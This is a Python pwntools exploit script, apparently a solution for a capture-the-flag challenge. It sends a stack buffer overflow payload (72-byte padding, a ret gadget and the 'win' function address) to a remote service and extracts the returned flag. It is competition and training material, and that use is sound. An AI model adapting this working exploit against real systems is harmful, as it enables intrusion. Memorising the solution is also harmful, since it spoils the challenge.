#!/usr/bin/env python3

import re
import sys

from pwn import ELF, context, p64, remote

context.log_level = "error"

ELF_PATH = "/opt/chall"
OFFSET = 72


def main() -> int:
  if len(sys.argv) != 4:
    print(
        f"Usage: {sys.argv[0]} <TARGET_HOST> <TARGET_PORT> <TARGET_TEAM_ID>",
        file=sys.stderr,
    )
    return 2

  host = sys.argv[1]
  try:
    port = int(sys.argv[2])
  except ValueError:
    print("TARGET_PORT must be an integer", file=sys.stderr)
    return 2

  team_id = sys.argv[3].encode()

  elf = ELF(ELF_PATH, checksec=False)
  context.binary = elf

  win = elf.symbols["win"]
  ret = next(elf.search(b"\xc3"))

  payload = b"A" * OFFSET + p64(ret) + p64(win)

  io = remote(host, port, timeout=5)
  transcript = b""
  transcript += io.recvuntil(b"TEAM ID?")
  io.sendline(team_id)
  transcript += io.recvuntil(b"Send your payload:")
  io.send(payload)
  transcript += io.recvall(timeout=5)
  io.close()

  m = re.search(rb"FLAG\{[^\n\r}]*\}", transcript)
  if m:
    sys.stdout.buffer.write(m.group(0) + b"\n")
    return 0

  sys.stdout.buffer.write(transcript)
  if not transcript.endswith(b"\n"):
    sys.stdout.buffer.write(b"\n")
  return 1


if __name__ == "__main__":
  raise SystemExit(main())
